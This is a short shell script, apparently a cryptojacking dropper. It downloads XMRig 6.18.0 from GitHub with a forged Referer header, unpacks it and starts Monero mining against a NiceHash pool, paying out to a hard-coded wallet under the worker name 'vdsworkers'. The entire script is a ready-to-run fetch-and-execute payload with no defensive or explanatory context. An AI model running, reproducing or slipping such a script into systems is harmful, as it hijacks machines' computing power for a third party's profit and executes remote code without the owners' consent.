#!/bin/sh
wget=/usr/bin/wget
wget http://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz --header "Referer: github.com"
tar -xf xmrig-6.18.0-linux-static-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3NXfb7dBziS9vex97LqFQB6KvEYxTBH2of.vdsworkers -p x -k --nicehash -a rx/0
